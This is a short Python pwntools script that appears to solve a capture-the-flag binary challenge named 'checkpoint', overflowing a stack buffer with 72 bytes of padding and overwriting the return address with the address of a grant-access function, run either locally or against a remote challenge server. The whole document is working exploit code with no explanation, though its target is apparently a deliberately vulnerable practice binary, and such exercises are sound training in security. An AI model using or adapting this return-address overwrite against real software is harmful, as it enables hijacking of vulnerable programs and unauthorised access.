#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./checkpoint')
context.log_level = 'info'

GRANT_ACCESS = 0x401216
OFFSET = 72

HOST = 'pwn.h7tex.com'
PORT = 43162

def exploit(target):
    payload  = b'A' * OFFSET
    payload += p64(GRANT_ACCESS)
    target.sendline(payload)
    data = target.recvall(timeout=5)
    print(data.decode(errors='replace'))

if __name__ == '__main__':
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process('./checkpoint')
    exploit(p)